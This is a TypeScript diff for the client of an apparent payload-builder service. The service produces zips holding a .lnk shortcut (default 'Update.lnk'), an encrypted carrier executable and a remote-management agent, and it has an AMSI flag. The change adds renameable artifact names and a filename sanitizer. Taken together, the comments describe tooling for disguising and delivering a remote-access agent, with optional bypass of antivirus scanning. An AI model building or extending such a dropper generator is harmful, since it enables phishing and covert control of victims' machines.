@@ -22,6 +22,24 @@ export interface CallZipGeneratorOpts {
   // the offline carrier exe directly (encrypted payload inside, nothing
   // downloaded at runtime). Absent/false = legacy Agent.lnk downloader zip.
   launcherMode?: boolean;
+  // FIX 3 — optional renameable artifact names (launcher mode). Blank/default
+  // values are omitted from the /build body so the generator uses its own
+  // defaults (byte-identical to the confirmed flow). Sanitized here too (same
+  // bare-name rule as the generator).
+  updateLinkName?: string; // the .lnk entry name (default "Update.lnk")
+  innerFolder?: string; // the subfolder holding launcher+payload (default "launcher")
+  zipName?: string; // the served download filename (default "Agent.zip")
+}
+
+// FIX 3: bare-name sanitizer — mirrors the generator's `clean` rule so a user
+// can't smuggle path separators / control chars / ".." traversal. Blank or
+// invalid -> "" (caller omits the flag so the generator uses its default).
+const INVALID_ARTIFACT_NAME = /[/\\"\u0000-\u001f]/;
+function safeArtifactName(value: string | undefined): string {
+  const s = (value ?? "").trim();
+  if (!s) return "";
+  if (INVALID_ARTIFACT_NAME.test(s) || s.includes("..") || s.length > 64) return "";
+  return s;
 }
 
 /**
@@ -53,6 +71,12 @@ export async function callZipGenerator(
   const controller = new AbortController();
   const timeout = setTimeout(() => controller.abort(), 60_000);
 
+  // FIX 3: sanitize the optional renameable names once; blank/invalid -> ""
+  // (omitted below so the generator uses its defaults — byte-identical flow).
+  const flagUpdateLinkName = safeArtifactName(opts.updateLinkName);
+  const flagInnerFolder = safeArtifactName(opts.innerFolder);
+  const flagZipName = safeArtifactName(opts.zipName);
+
   try {
     const res = await fetch(`${env.zipGeneratorUrl}/build`, {
       method: "POST",
@@ -73,6 +97,10 @@ export async function callZipGenerator(
         flags: {
           amsi: "none", // Guardrail: AMSI default none — never a bypass by default.
           fileName: opts.fileName ?? "trmm-agent.exe",
+          // FIX 3: optional renameable names — only send when sanitized present.
+          ...(flagUpdateLinkName ? { updateLinkName: flagUpdateLinkName } : {}),
+          ...(flagInnerFolder ? { innerFolder: flagInnerFolder } : {}),
+          ...(flagZipName ? { zipName: flagZipName } : {}),
         },
       }),
       signal: controller.signal,
